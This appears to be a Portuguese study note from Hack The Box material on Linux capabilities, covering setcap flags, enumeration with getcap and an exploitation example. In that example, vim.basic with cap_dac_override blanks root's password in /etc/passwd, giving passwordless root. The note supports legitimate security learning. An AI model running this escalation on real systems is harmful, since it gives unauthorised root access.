# Capabilities no Linux

Capabilities no Linux são um recurso de segurança que permite conceder privilégios específicos a processos, possibilitando ações que normalmente seriam restritas. Isso oferece um controle mais granular do que o modelo Unix tradicional baseado apenas em usuários e grupos.

Por outro lado, como qualquer mecanismo de segurança, capabilities podem ser mal utilizadas e exploradas. Um problema comum é conceder capabilities a processos sem isolamento/sandbox adequados, o que pode abrir caminho para escalada de privilégios e acesso indevido a dados sensíveis.  
Outro risco é excesso de permissões: quando um binário recebe mais privilégios do que precisa, a superfície de ataque aumenta.

Em resumo, capabilities são úteis, mas exigem configuração cuidadosa.

## Definindo capabilities

Em Ubuntu, podemos usar `setcap` para atribuir capabilities a executáveis:

```bash
JLMreal@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

Quando uma capability é aplicada a um binário, ele passa a executar ações permitidas por essa capability sem precisar de root completo.  
Exemplo: com `cap_net_bind_service`, o binário pode bindar portas de rede privilegiadas.

Algumas capabilities são especialmente perigosas se mal configuradas, como `cap_sys_admin`, pois permitem ações administrativas amplas.

## Capabilities relevantes

| Capability | Descrição |
|---|---|
| `cap_sys_admin` | Permite ações administrativas amplas (alterar configurações, montar/desmontar FS etc.). |
| `cap_sys_chroot` | Permite alterar o diretório root do processo (`chroot`). |
| `cap_sys_ptrace` | Permite anexar/debugar processos de terceiros. |
| `cap_sys_nice` | Permite alterar prioridade de processos. |
| `cap_sys_time` | Permite modificar o relógio do sistema. |
| `cap_sys_resource` | Permite alterar limites de recursos do sistema. |
| `cap_sys_module` | Permite carregar/descarregar módulos de kernel. |
| `cap_net_bind_service` | Permite bind em portas de rede privilegiadas. |

Um binário com capabilities executa apenas as ações permitidas por elas, sem ganhar permissões fora desse escopo.

## Valores usados com setcap

Ao usar `setcap`, além da capability, definimos flags de aplicação:

| Valor | Descrição |
|---|---|
| `=` | Define/zera capability sem conceder privilégios efetivos. |
| `+ep` | Concede privilégios **effective** e **permitted** para a capability. |
| `+ei` | Concede privilégios **effective** e **inheritable**. |
| `+p` | Concede apenas **permitted** (sem herança implícita de execução). |

## Capabilities associadas à escalada de privilégios

| Capability | Descrição |
|---|---|
| `cap_setuid` | Permite definir UID efetivo do processo (inclusive root). |
| `cap_setgid` | Permite definir GID efetivo do processo (inclusive grupo root). |
| `cap_sys_admin` | Conjunto amplo de privilégios administrativos. |
| `cap_dac_override` | Ignora checagens de permissão de leitura/escrita/execução em arquivos. |

## Enumerando capabilities

Para listar capabilities de binários em diretórios comuns:

```bash
JLMreal@htb[/htb]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

```text
/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

Esse one-liner busca binários e executa `getcap` em cada um, mostrando capabilities configuradas.

## Exploração (exemplo do material)

Se um usuário de baixo privilégio encontra `cap_dac_override` em um binário:

```bash
JLMreal@htb[/htb]$ getcap /usr/bin/vim.basic
```

```text
/usr/bin/vim.basic cap_dac_override=eip
```

No exemplo, `vim.basic` sem sudo, mas com `cap_dac_override`, pode editar arquivos protegidos, como `/etc/passwd`.

Verificando a linha do root:

```bash
JLMreal@htb[/htb]$ cat /etc/passwd | head -n1
```

```text
root:x:0:0:root:/root:/bin/bash
```

Editando interativamente:

```bash
JLMreal@htb[/htb]$ /usr/bin/vim.basic /etc/passwd
```

Ou de forma não interativa:

```bash
JLMreal@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
JLMreal@htb[/htb]$ cat /etc/passwd | head -n1
```

```text
root::0:0:root:/root:/bin/bash
```

Sem o `x`, a conta root fica sem hash em `/etc/passwd` (no cenário do exemplo), o que permite `su` sem senha.

## Resumo curto

Capabilities servem para dar **poderes específicos** a um binário (sem dar root completo).  
Você usa assim: **(1)** enumera com `getcap`/`find ... -exec getcap`, **(2)** identifica capability perigosa (`cap_dac_override`, `cap_setuid`, `cap_sys_admin`), **(3)** valida se o binário permite abuso para leitura/escrita/execução privilegiada.
